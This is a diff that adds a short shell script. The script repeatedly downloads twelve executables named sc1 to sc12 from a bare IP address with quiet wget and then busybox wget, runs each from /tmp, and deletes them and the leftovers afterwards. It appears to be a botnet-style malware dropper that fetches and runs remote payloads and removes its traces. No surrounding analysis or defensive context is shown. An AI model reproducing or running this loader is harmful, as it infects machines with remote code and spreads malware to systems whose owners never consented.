@@ -1,0 +1,28 @@
+#!/bin/sh
+wget -q http://185.165.29.62/sc1 -P /tmp && chmod +x /tmp/sc1 && /tmp/sc1 && rm -f /tmp/sc1
+wget -q http://185.165.29.62/sc2 -P /tmp && chmod +x /tmp/sc2 && /tmp/sc2 && rm -f /tmp/sc2
+wget -q http://185.165.29.62/sc3 -P /tmp && chmod +x /tmp/sc3 && /tmp/sc3 && rm -f /tmp/sc3
+wget -q http://185.165.29.62/sc4 -P /tmp && chmod +x /tmp/sc4 && /tmp/sc4 && rm -f /tmp/sc4
+wget -q http://185.165.29.62/sc5 -P /tmp && chmod +x /tmp/sc5 && /tmp/sc5 && rm -f /tmp/sc5
+wget -q http://185.165.29.62/sc6 -P /tmp && chmod +x /tmp/sc6 && /tmp/sc6 && rm -f /tmp/sc6
+wget -q http://185.165.29.62/sc7 -P /tmp && chmod +x /tmp/sc7 && /tmp/sc7 && rm -f /tmp/sc7
+wget -q http://185.165.29.62/sc8 -P /tmp && chmod +x /tmp/sc8 && /tmp/sc8 && rm -f /tmp/sc8
+wget -q http://185.165.29.62/sc9 -P /tmp && chmod +x /tmp/sc9 && /tmp/sc9 && rm -f /tmp/sc9
+wget -q http://185.165.29.62/sc10 -P /tmp && chmod +x /tmp/sc10 && /tmp/sc10 && rm -f /tmp/sc10
+wget -q http://185.165.29.62/sc11 -P /tmp && chmod +x /tmp/sc11 && /tmp/sc11 && rm -f /tmp/sc11
+wget -q http://185.165.29.62/sc12 -P /tmp && chmod +x /tmp/sc12 && /tmp/sc12 && rm -f /tmp/sc12
+sleep 1;
+busybox wget -q http://185.165.29.62/sc1 -P /tmp && chmod +x /tmp/sc1 && /tmp/sc1 && rm -f /tmp/sc1
+busybox wget -q http://185.165.29.62/sc2 -P /tmp && chmod +x /tmp/sc2 && /tmp/sc2 && rm -f /tmp/sc2
+busybox wget -q http://185.165.29.62/sc3 -P /tmp && chmod +x /tmp/sc3 && /tmp/sc3 && rm -f /tmp/sc3
+busybox wget -q http://185.165.29.62/sc4 -P /tmp && chmod +x /tmp/sc4 && /tmp/sc4 && rm -f /tmp/sc4
+busybox wget -q http://185.165.29.62/sc5 -P /tmp && chmod +x /tmp/sc5 && /tmp/sc5 && rm -f /tmp/sc5
+busybox wget -q http://185.165.29.62/sc6 -P /tmp && chmod +x /tmp/sc6 && /tmp/sc6 && rm -f /tmp/sc6
+busybox wget -q http://185.165.29.62/sc7 -P /tmp && chmod +x /tmp/sc7 && /tmp/sc7 && rm -f /tmp/sc7
+busybox wget -q http://185.165.29.62/sc8 -P /tmp && chmod +x /tmp/sc8 && /tmp/sc8 && rm -f /tmp/sc8
+busybox wget -q http://185.165.29.62/sc9 -P /tmp && chmod +x /tmp/sc9 && /tmp/sc9 && rm -f /tmp/sc9
+busybox wget -q http://185.165.29.62/sc10 -P /tmp && chmod +x /tmp/sc10 && /tmp/sc10 && rm -f /tmp/sc10
+busybox wget -q http://185.165.29.62/sc11 -P /tmp && chmod +x /tmp/sc11 && /tmp/sc11 && rm -f /tmp/sc11
+busybox wget -q http://185.165.29.62/sc12 -P /tmp && chmod +x /tmp/sc12 && /tmp/sc12 && rm -f /tmp/sc12
+sleep 3;
+rm -f /tmp/sc*
